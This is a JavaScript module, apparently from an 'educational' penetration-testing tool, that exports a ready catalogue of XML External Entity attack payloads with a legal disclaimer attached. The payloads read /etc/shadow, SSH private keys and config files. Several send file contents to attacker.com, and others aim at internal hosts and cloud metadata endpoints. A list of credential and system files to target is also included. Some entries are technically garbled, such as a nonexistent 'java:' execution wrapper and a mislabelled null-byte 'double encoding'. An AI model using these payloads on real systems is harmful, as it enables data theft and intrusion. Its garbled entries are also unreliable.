// XML External Entity (XXE) Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const xxePayloads = {
  fileDisclosure: {
    name: 'File Disclosure / Local File Inclusion',
    description: 'Read local files from the server',
    category: 'Information Disclosure',
    payloads: [
      {
        name: 'Basic XXE - /etc/passwd',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE - /etc/shadow',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE - Windows config',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE - SSH private key',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE - Web.config',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/web.config">]>
<root>&xxe;</root>`
      }
    ]
  },
  parameterEntity: {
    name: 'Parameter Entity - Advanced XXE',
    description: 'Using parameter entities for XXE attacks',
    category: 'Advanced',
    payloads: [
      {
        name: 'Parameter Entity XXE',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>`
      },
      {
        name: 'Out-of-band XXE via HTTP',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>XXE</root>`
      }
    ]
  },
  blindXXE: {
    name: 'Blind XXE - Error-based',
    description: 'XXE without direct output (time-based or error-based)',
    category: 'Blind Exploitation',
    payloads: [
      {
        name: 'Blind XXE via error message',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; eval SYSTEM 'http://attacker.com/?file=%xxe;'>">
  %error;
]>
<foo>&xxe;</foo>`
      },
      {
        name: 'Blind XXE via DNS exfiltration',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com:8000/?data=%file;">
  %dtd;
]>
<foo>Blind XXE</foo>`
      }
    ]
  },

  remoteCodeExecution: {
    name: 'XXE to RCE',
    description: 'Remote Code Execution through XXE',
    category: 'Code Execution',
    payloads: [
      {
        name: 'XXE to RCE via expect protocol',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE to RCE via PHP wrapper',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE via JAVA runtime',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "java:java.lang.Runtime.getRuntime().exec(&#34;id&#34;)">
]>
<root>&xxe;</root>`
      }
    ]
  },
  ssrf: {
    name: 'XXE to SSRF',
    description: 'Server-Side Request Forgery via XXE',
    category: 'SSRF',
    payloads: [
      {
        name: 'XXE SSRF - Internal network scan',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE SSRF - Localhost access',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/config">
]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE SSRF - AWS metadata',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>`
      }
    ]
  },
  encodings: {
    name: 'XXE with Different Encodings',
    description: 'XXE bypassing filters using encoding tricks',
    category: 'Bypass Techniques',
    payloads: [
      {
        name: 'XXE with UTF-7 encoding',
        code: `<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`
      },
      {
        name: 'XXE with double encoding',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd%00">
]>
<root>&xxe;</root>`
      }
    ]
  },
  soap: {
    name: 'XXE in SOAP/Web Services',
    description: 'XXE attacks against SOAP services',
    category: 'Web Services',
    payloads: [
      {
        name: 'SOAP XXE attack',
        code: `<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soap:Body>
    <GetUserRequest>
      <username>&xxe;</username>
    </GetUserRequest>
  </soap:Body>
</soap:Envelope>`
      }
    ]
  }
}

export const commonTargets = {
  linux: [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/root/.ssh/id_rsa',
    '/root/.bash_history',
    '/var/www/html/config.php',
    '/app/config/database.yml'
  ],
  windows: [
    'c:\\windows\\win.ini',
    'c:\\windows\\system32\\drivers\\etc\\hosts',
    'c:\\windows\\system32\\config\\SAM',
    'c:\\inetpub\\wwwroot\\web.config',
    'c:\\xampp\\mysql\\data\\mysql\\user.MYD'
  ],
  cloud: [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity'
  ]
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(xxePayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(xxePayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

XXE (XML External Entity) attacks can be extremely dangerous and disruptive.
This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

XXE attacks can:
✓ Lead to data breaches and data exfiltration
✓ Cause denial of service conditions
✓ Enable remote code execution
✓ Access internal systems and credentials
✓ Result in significant financial and legal consequences

Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized XXE attacks are ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Significant fines
• Permanent record

By using this tool, you acknowledge responsibility for your actions.
`
